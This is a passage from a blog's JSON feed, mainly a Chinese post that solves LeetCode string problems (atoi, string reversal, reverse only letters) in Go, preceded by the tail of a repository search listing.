https://hellogithub.com/repository/90d09676b2ef41d3926c559f1cfe50bd name: godot </pre></td></tr><tr><td data-num=\"22\"></td><td><pre>url: https://hellogithub.com/repository/477f8761bfba44c9af6db686de687997 name: Starward </pre></td></tr><tr><td data-num=\"23\"></td><td><pre>url: https://hellogithub.com/repository/b899e2f98f07495aa20a7655b1d716a1 name: Cemu </pre></td></tr><tr><td data-num=\"24\"></td><td><pre>url: https://hellogithub.com/repository/4e3f84780ad54eb69b16a95a48d955a5 name: azerothcore-wotlk </pre></td></tr><tr><td data-num=\"25\"></td><td><pre>url: https://hellogithub.com/repository/fdfaaec2527844198dfd6b54cb20875d name: Playnite </pre></td></tr><tr><td data-num=\"26\"></td><td><pre>url: https://hellogithub.com/repository/1d1e346df2174e9d83658d66d3ddfa34 name: Ryujinx </pre></td></tr><tr><td data-num=\"27\"></td><td><pre>url: https://hellogithub.com/repository/fe47d51db0a24dff989863e4f172e085 name: yuzu </pre></td></tr><tr><td data-num=\"28\"></td><td><pre>url: https://hellogithub.com/repository/ea8f86ffd45340f2a33b1a5a59d7543c name: citra </pre></td></tr><tr><td data-num=\"29\"></td><td><pre>url: https://hellogithub.com/repository/d4384ff4b84a4fc6acfb7e7ae44b06ce name: ppsspp </pre></td></tr><tr><td data-num=\"30\"></td><td><pre>url: https://hellogithub.com/repository/8956118d16f94273a97fa793b73ce78c name: Cytopia </pre></td></tr><tr><td data-num=\"31\"></td><td><pre>url: https://hellogithub.com/repository/3603a18c7672445c88bbc404a960b69f name: flatbuffers </pre></td></tr><tr><td data-num=\"32\"></td><td><pre>url: https://hellogithub.com/repository/c763339910d64e4cbeb41f7a382a5eae name: TowerDefense-GameFramework-Demo </pre></td></tr><tr><td data-num=\"33\"></td><td><pre>url: https://hellogithub.com/repository/41f14032e54a4c5fb40e2773d0f73313 name: SteamTools </pre></td></tr><tr><td data-num=\"34\"></td><td><pre>url: https://hellogithub.com/repository/4b0436482e2e468386f57bd43fd4ffb8 name: xemu </pre></td></tr><tr><td data-num=\"35\"></td><td><pre>url: https://hellogithub.com/repository/fca5dff8568d4ea4ad81a8e9c01fabf3 name: terminal </pre></td></tr><tr><td data-num=\"36\"></td><td><pre>algolia: search success </pre></td></tr><tr><td data-num=\"37\"></td><td><pre></pre></td></tr><tr><td data-num=\"38\"></td><td><pre><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span></pre></td></tr></table></figure>",
            "tags": [
                "计算机科学",
                "Search",
                "git",
                "search"
            ]
        },
        {
            "id": "https://blog.twelveeee.top/2023/AlgorithmCamp2023/12_String/",
            "url": "https://blog.twelveeee.top/2023/AlgorithmCamp2023/12_String/",
            "title": "12-字符串",
            "date_published": "2023-12-01T14:00:00.000Z",
            "content_html": "<h1 id=\"字符串\"><a class=\"anchor\" href=\"#字符串\">#</a> 字符串</h1>\n<p>Go 标准库源码解析 - 文本操作：<a href=\"https://blog.twelveeee.top/2023/Go/Lib/strings/\">https://blog.twelveeee.top/2023/Go/Lib/strings/</a></p>\n<h2 id=\"算法题\"><a class=\"anchor\" href=\"#算法题\">#</a> 算法题</h2>\n<h3 id=\"1-转换成小写字母\"><a class=\"anchor\" href=\"#1-转换成小写字母\">#</a> 1. 转换成小写字母</h3>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9sZWV0Y29kZS5jbi9wcm9ibGVtcy90by1sb3dlci1jYXNlL2Rlc2NyaXB0aW9uLw==\">https://leetcode.cn/problems/to-lower-case/description/</span></p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL1R3ZWx2ZWVlZS9BbGdvcml0aG1DYW1wMjAyMy9ibG9iL21haW4vMTJfU3RyaW5nL2xldmVsXzEvdG9waWNfMS5nbw==\">https://github.com/Twelveeee/AlgorithmCamp2023/blob/main/12_String/level_1/topic_1.go</span></p>\n<blockquote>\n<p>给你一个字符串  <code>s</code>  ，将该字符串中的大写字母转换成相同的小写字母，返回新的字符串。</p>\n</blockquote>\n<figure class=\"highlight go\"><figcaption data-lang=\"go\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">func</span> <span class=\"token function\">toLowerCase</span><span class=\"token punctuation\">(</span>s <span class=\"token builtin\">string</span><span class=\"token punctuation\">)</span> <span class=\"token builtin\">string</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>\t<span class=\"token keyword\">return</span> strings<span class=\"token punctuation\">.</span><span class=\"token function\">ToLower</span><span class=\"token punctuation\">(</span>s<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token keyword\">func</span> <span class=\"token function\">toLowerCaseV2</span><span class=\"token punctuation\">(</span>s <span class=\"token builtin\">string</span><span class=\"token punctuation\">)</span> <span class=\"token builtin\">string</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>\tans <span class=\"token operator\">:=</span> strings<span class=\"token punctuation\">.</span>Builder<span class=\"token punctuation\">&#123;</span><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>\tans<span class=\"token punctuation\">.</span><span class=\"token function\">Grow</span><span class=\"token punctuation\">(</span><span class=\"token function\">len</span><span class=\"token punctuation\">(</span>s<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>\t<span class=\"token keyword\">for</span> <span class=\"token boolean\">_</span><span class=\"token punctuation\">,</span> ch <span class=\"token operator\">:=</span> <span class=\"token keyword\">range</span> s <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>\t\t<span class=\"token keyword\">if</span> ch <span class=\"token operator\">>=</span> <span class=\"token char\">'A'</span> <span class=\"token operator\">&amp;&amp;</span> ch <span class=\"token operator\">&lt;=</span> <span class=\"token char\">'Z'</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>\t\t\tch <span class=\"token operator\">+=</span> <span class=\"token number\">32</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>\t\t<span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>\t\tans<span class=\"token punctuation\">.</span><span class=\"token function\">WriteRune</span><span class=\"token punctuation\">(</span>ch<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>\t<span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>\t<span class=\"token keyword\">return</span> ans<span class=\"token punctuation\">.</span><span class=\"token function\">String</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><h3 id=\"2-字符串转换整数\"><a class=\"anchor\" href=\"#2-字符串转换整数\">#</a> 2.  字符串转换整数</h3>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9sZWV0Y29kZS5jbi9wcm9ibGVtcy9zdHJpbmctdG8taW50ZWdlci1hdG9pL2Rlc2NyaXB0aW9uLw==\">https://leetcode.cn/problems/string-to-integer-atoi/description/</span></p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL1R3ZWx2ZWVlZS9BbGdvcml0aG1DYW1wMjAyMy9ibG9iL21haW4vMTJfU3RyaW5nL2xldmVsXzEvdG9waWNfMi5nbw==\">https://github.com/Twelveeee/AlgorithmCamp2023/blob/main/12_String/level_1/topic_2.go</span></p>\n<blockquote>\n<p>请你来实现一个  <code>myAtoi(string s)</code>  函数，使其能将字符串转换成一个 32 位有符号整数（类似 C/C++ 中的  <code>atoi</code>  函数）。</p>\n<p>函数  <code>myAtoi(string s)</code>  的算法如下：</p>\n<ol>\n<li>读入字符串并丢弃无用的前导空格</li>\n<li>检查下一个字符（假设还未到字符末尾）为正还是负号，读取该字符（如果有）。 确定最终结果是负数还是正数。 如果两者都不存在，则假定结果为正。</li>\n<li>读入下一个字符，直到到达下一个非数字字符或到达输入的结尾。字符串的其余部分将被忽略。</li>\n<li>将前面步骤读入的这些数字转换为整数（即，&quot;123&quot; -&gt; 123， &quot;0032&quot; -&gt; 32）。如果没有读入数字，则整数为  <code>0</code>  。必要时更改符号（从步骤 2 开始）。</li>\n<li>如果整数数超过 32 位有符号整数范围  <code>[−231, 231 − 1]</code>  ，需要截断这个整数，使其保持在这个范围内。具体来说，小于  <code>−231</code>  的整数应该被固定为  <code>−231</code>  ，大于  <code>231 − 1</code>  的整数应该被固定为  <code>231 − 1</code>  。</li>\n<li>返回整数作为最终结果。</li>\n</ol>\n<p><strong>注意：</strong></p>\n<ul>\n<li>本题中的空白字符只包括空格字符  <code>' '</code>  。</li>\n<li>除前导空格或数字后的其余字符串外，<strong>请勿忽略</strong> 任何其他字符。</li>\n</ul>\n</blockquote>\n<figure class=\"highlight go\"><figcaption data-lang=\"go\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">func</span> <span class=\"token function\">myAtoi</span><span class=\"token punctuation\">(</span>s <span class=\"token builtin\">string</span><span class=\"token punctuation\">)</span> <span class=\"token builtin\">int</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>\ti<span class=\"token punctuation\">,</span> ans<span class=\"token punctuation\">,</span> n <span class=\"token operator\">:=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token function\">len</span><span class=\"token punctuation\">(</span>s<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>\tflag <span class=\"token operator\">:=</span> <span class=\"token number\">1</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>\t<span class=\"token keyword\">for</span> i <span class=\"token operator\">&lt;</span> n <span class=\"token operator\">&amp;&amp;</span> s<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span> <span class=\"token operator\">==</span> <span class=\"token char\">' '</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>\t\ti<span class=\"token operator\">++</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>\t<span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>\t<span class=\"token keyword\">if</span> i <span class=\"token operator\">&lt;</span> n <span class=\"token operator\">&amp;&amp;</span> s<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span> <span class=\"token operator\">==</span> <span class=\"token char\">'-'</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>\t\tflag <span class=\"token operator\">=</span> <span class=\"token operator\">-</span><span class=\"token number\">1</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>\t\ti<span class=\"token operator\">++</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>\t<span class=\"token punctuation\">&#125;</span> <span class=\"token keyword\">else</span> <span class=\"token keyword\">if</span> i <span class=\"token operator\">&lt;</span> n <span class=\"token operator\">&amp;&amp;</span> s<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span> <span class=\"token operator\">==</span> <span class=\"token char\">'+'</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>\t\ti<span class=\"token operator\">++</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>\t<span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>\t<span class=\"token keyword\">for</span> i <span class=\"token operator\">&lt;</span> n <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>\t\t<span class=\"token keyword\">if</span> s<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span> <span class=\"token operator\">&lt;</span> <span class=\"token char\">'0'</span> <span class=\"token operator\">||</span> s<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span> <span class=\"token operator\">></span> <span class=\"token char\">'9'</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>\t\t\t<span class=\"token keyword\">return</span> ans <span class=\"token operator\">*</span> flag</pre></td></tr><tr><td data-num=\"17\"></td><td><pre>\t\t<span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>\t\tans <span class=\"token operator\">*=</span> <span class=\"token number\">10</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>\t\tans <span class=\"token operator\">+=</span> <span class=\"token function\">int</span><span class=\"token punctuation\">(</span>s<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span> <span class=\"token operator\">-</span> <span class=\"token char\">'0'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>\t\t<span class=\"token keyword\">if</span> ans<span class=\"token operator\">*</span>flag <span class=\"token operator\">&lt;</span> math<span class=\"token punctuation\">.</span>MinInt32 <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>\t\t\t<span class=\"token keyword\">return</span> math<span class=\"token punctuation\">.</span>MinInt32</pre></td></tr><tr><td data-num=\"23\"></td><td><pre>\t\t<span class=\"token punctuation\">&#125;</span> <span class=\"token keyword\">else</span> <span class=\"token keyword\">if</span> ans<span class=\"token operator\">*</span>flag <span class=\"token operator\">></span> math<span class=\"token punctuation\">.</span>MaxInt32 <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>\t\t\t<span class=\"token keyword\">return</span> math<span class=\"token punctuation\">.</span>MaxInt32</pre></td></tr><tr><td data-num=\"25\"></td><td><pre>\t\t<span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>\t\ti<span class=\"token operator\">++</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>\t<span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>\t<span class=\"token keyword\">return</span> ans <span class=\"token operator\">*</span> flag</pre></td></tr><tr><td data-num=\"31\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><h3 id=\"3-反转字符串\"><a class=\"anchor\" href=\"#3-反转字符串\">#</a> 3. 反转字符串</h3>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9sZWV0Y29kZS5jbi9wcm9ibGVtcy9yZXZlcnNlLXN0cmluZy9kZXNjcmlwdGlvbi8=\">https://leetcode.cn/problems/reverse-string/description/</span></p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL1R3ZWx2ZWVlZS9BbGdvcml0aG1DYW1wMjAyMy9ibG9iL21haW4vMTJfU3RyaW5nL2xldmVsXzIvdG9waWNfMS5nbw==\">https://github.com/Twelveeee/AlgorithmCamp2023/blob/main/12_String/level_2/topic_1.go</span></p>\n<blockquote>\n<p>编写一个函数，其作用是将输入的字符串反转过来。输入字符串以字符数组  <code>s</code>  的形式给出。</p>\n<p>不要给另外的数组分配额外的空间，你必须<strong>原地改输入数组</strong>、使用 O (1) 的额外空间解决这一问题。</p>\n</blockquote>\n<figure class=\"highlight go\"><figcaption data-lang=\"go\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">func</span> <span class=\"token function\">reverseString</span><span class=\"token punctuation\">(</span>s <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token builtin\">byte</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>\t<span class=\"token keyword\">for</span> i <span class=\"token operator\">:=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span> i <span class=\"token operator\">&lt;</span> <span class=\"token function\">len</span><span class=\"token punctuation\">(</span>s<span class=\"token punctuation\">)</span><span class=\"token operator\">/</span><span class=\"token number\">2</span><span class=\"token punctuation\">;</span> i<span class=\"token operator\">++</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>\t\ts<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> s<span class=\"token punctuation\">[</span><span class=\"token function\">len</span><span class=\"token punctuation\">(</span>s<span class=\"token punctuation\">)</span><span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token operator\">-</span>i<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> s<span class=\"token punctuation\">[</span><span class=\"token function\">len</span><span class=\"token punctuation\">(</span>s<span class=\"token punctuation\">)</span><span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token operator\">-</span>i<span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> s<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>\t<span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><h3 id=\"4-反转字符串-ii\"><a class=\"anchor\" href=\"#4-反转字符串-ii\">#</a> 4. 反转字符串 II</h3>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9sZWV0Y29kZS5jbi9wcm9ibGVtcy9yZXZlcnNlLXN0cmluZy1paS8=\">https://leetcode.cn/problems/reverse-string-ii/</span></p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL1R3ZWx2ZWVlZS9BbGdvcml0aG1DYW1wMjAyMy9ibG9iL21haW4vMTJfU3RyaW5nL2xldmVsXzIvdG9waWNfMi5nbw==\">https://github.com/Twelveeee/AlgorithmCamp2023/blob/main/12_String/level_2/topic_2.go</span></p>\n<blockquote>\n<p>给定一个字符串  <code>s</code>  和一个整数  <code>k</code> ，从字符串开头算起，每计数至  <code>2k</code>  个字符，就反转这  <code>2k</code>  字符中的前  <code>k</code>  个字符。</p>\n<ul>\n<li>如果剩余字符少于  <code>k</code>  个，则将剩余字符全部反转。</li>\n<li>如果剩余字符小于  <code>2k</code>  但大于或等于  <code>k</code>  个，则反转前  <code>k</code>  个字符，其余字符保持原样。</li>\n</ul>\n</blockquote>\n<figure class=\"highlight go\"><figcaption data-lang=\"go\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">func</span> <span class=\"token function\">reverseStr</span><span class=\"token punctuation\">(</span>s <span class=\"token builtin\">string</span><span class=\"token punctuation\">,</span> k <span class=\"token builtin\">int</span><span class=\"token punctuation\">)</span> <span class=\"token builtin\">string</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>\tans <span class=\"token operator\">:=</span> <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token function\">byte</span><span class=\"token punctuation\">(</span>s<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>\ttimes <span class=\"token operator\">:=</span> <span class=\"token function\">len</span><span class=\"token punctuation\">(</span>s<span class=\"token punctuation\">)</span> <span class=\"token operator\">/</span> <span class=\"token punctuation\">(</span><span class=\"token number\">2</span> <span class=\"token operator\">*</span> k<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>\t<span class=\"token keyword\">if</span> <span class=\"token function\">len</span><span class=\"token punctuation\">(</span>s<span class=\"token punctuation\">)</span><span class=\"token operator\">%</span><span class=\"token punctuation\">(</span><span class=\"token number\">2</span><span class=\"token operator\">*</span>k<span class=\"token punctuation\">)</span> <span class=\"token operator\">!=</span> <span class=\"token number\">0</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>\t\ttimes<span class=\"token operator\">++</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>\t<span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>\t<span class=\"token keyword\">for</span> i <span class=\"token operator\">:=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span> i <span class=\"token operator\">&lt;=</span> times<span class=\"token punctuation\">;</span> i<span class=\"token operator\">++</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>\t\tleft<span class=\"token punctuation\">,</span> rihgt <span class=\"token operator\">:=</span> i<span class=\"token operator\">*</span><span class=\"token number\">2</span><span class=\"token operator\">*</span>k<span class=\"token punctuation\">,</span> <span class=\"token punctuation\">(</span>i<span class=\"token operator\">*</span><span class=\"token number\">2</span><span class=\"token operator\">*</span>k<span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>k</pre></td></tr><tr><td data-num=\"10\"></td><td><pre>\t\t<span class=\"token keyword\">if</span> rihgt <span class=\"token operator\">></span> <span class=\"token function\">len</span><span class=\"token punctuation\">(</span>s<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>\t\t\trihgt <span class=\"token operator\">=</span> <span class=\"token function\">len</span><span class=\"token punctuation\">(</span>s<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>\t\t<span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>\t\t<span class=\"token keyword\">for</span> j <span class=\"token operator\">:=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span> j <span class=\"token operator\">&lt;</span> <span class=\"token punctuation\">(</span>rihgt<span class=\"token operator\">-</span>left<span class=\"token punctuation\">)</span><span class=\"token operator\">/</span><span class=\"token number\">2</span><span class=\"token punctuation\">;</span> j<span class=\"token operator\">++</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>\t\t\tans<span class=\"token punctuation\">[</span>left<span class=\"token operator\">+</span>j<span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> ans<span class=\"token punctuation\">[</span>rihgt<span class=\"token operator\">-</span>j<span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> ans<span class=\"token punctuation\">[</span>rihgt<span class=\"token operator\">-</span>j<span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> ans<span class=\"token punctuation\">[</span>left<span class=\"token operator\">+</span>j<span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>\t\t<span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>\t<span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>\t<span class=\"token keyword\">return</span> <span class=\"token function\">string</span><span class=\"token punctuation\">(</span>ans<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><h3 id=\"5-仅仅反转字母\"><a class=\"anchor\" href=\"#5-仅仅反转字母\">#</a> 5. 仅仅反转字母</h3>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9sZWV0Y29kZS5jbi9wcm9ibGVtcy9yZXZlcnNlLW9ubHktbGV0dGVycy9kZXNjcmlwdGlvbi8=\">https://leetcode.cn/problems/reverse-only-letters/description/</span></p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL1R3ZWx2ZWVlZS9BbGdvcml0aG1DYW1wMjAyMy9ibG9iL21haW4vMTJfU3RyaW5nL2xldmVsXzIvdG9waWNfMy5nbw==\">https://github.com/Twelveeee/AlgorithmCamp2023/blob/main/12_String/level_2/topic_3.go</span></p>\n<blockquote>\n<p>给你一个字符串  <code>s</code>  ，根据下述规则反转字符串：</p>\n<ul>\n<li>所有非英文字母保留在原有位置。</li>\n<li>所有英文字母（小写或大写）位置反转。</li>\n</ul>\n<p>返回反转后的  <code>s</code>  <em>。</em></p>\n</blockquote>\n<figure class=\"highlight go\"><figcaption data-lang=\"go\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">func</span> <span class=\"token function\">reverseOnlyLetters</span><span class=\"token punctuation\">(</span>s <span class=\"token builtin\">string</span><span class=\"token punctuation\">)</span> <span class=\"token builtin\">string</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>\tans <span class=\"token operator\">:=</span> <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token function\">byte</span><span class=\"token punctuation\">(</span>s<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>\tw <span class=\"token operator\">:=</span> <span class=\"token number\">0</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>\t<span class=\"token keyword\">for</span> i <span class=\"token operator\">:=</span> <span class=\"token function\">len</span><span class=\"token punctuation\">(</span>s<span class=\"token punctuation\">)</span> <span class=\"token operator\">-</span> <span class=\"token number\">1</span><span class=\"token punctuation\">;</span> i <span class=\"token operator\">>=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span> i<span class=\"token operator\">--</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>\t\t<span class=\"token keyword\">if</span> s<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span> <span class=\"token operator\">></span> <span class=\"token char\">'z'</span> <span class=\"token operator\">||</span> s<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span> <span class=\"token operator\">&lt;</span> <span class=\"token char\">'A'</span> <span class=\"token operator\">||</span> <span class=\"token punctuation\">(</span>s<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span> <span class=\"token operator\">></span> <span class=\"token char\">'Z'</span> <span class=\"token operator\">&amp;&amp;</span> s<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span> <span class=\"token operator\">&lt;</span> <span class=\"token char\">'a'</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>\t\t\t<span class=\"token keyword\">continue</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>\t\t<span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>\t\t<span class=\"token keyword\">for</span> w <span class=\"token operator\">&lt;</span> <span class=\"token function\">len</span><span class=\"token punctuation\">(</span>ans<span class=\"token punctuation\">)</span> <span class=\"token operator\">&amp;&amp;</span> <span class=\"token punctuation\">(</span>ans<span class=\"token punctuation\">[</span>w<span class=\"token punctuation\">]</span> <span class=\"token operator\">></span> <span class=\"token char\">'z'</span> <span class=\"token operator\">||</span> ans<span class=\"token punctuation\">[</span>w<span class=\"token punctuation\">]</span> <span class=\"token operator\">&lt;</span> <span class=\"token char\">'A'</span> <span class=\"token operator\">||</span> <span class=\"token punctuation\">(</span>ans<span class=\"token punctuation\">[</span>w<span class=\"token punctuation\">]</span> <span class=\"token operator\">></span> <span class=\"token char\">'Z'</span> <span class=\"token operator\">&amp;&amp;</span> ans<span class=\"token punctuation\">[</span>w<span class=\"token punctuation\">]</span> <span class=\"token operator\">&lt;</span> <span class=\"token char\">'a'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>\t\t\tw<span class=\"token operator\">++</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>\t\t<span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>\t\tans<span class=\"token punctuation\">[</span>w<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> s<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>\t\tw<span class=\"token operator\">++</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>\t<span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>\t<span class=\"token keyword\">return</span> <span class=\"token function\">string</span><span class=\"token punctuation\">(</span>ans<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><h3 id=\"5-仅仅反转字母-2\"><a class=\"anchor\" href=\"#5-仅仅反转字母-2\">#</a> 5. 仅仅反转字母</h3>\n<p><span class=\"exturl\" 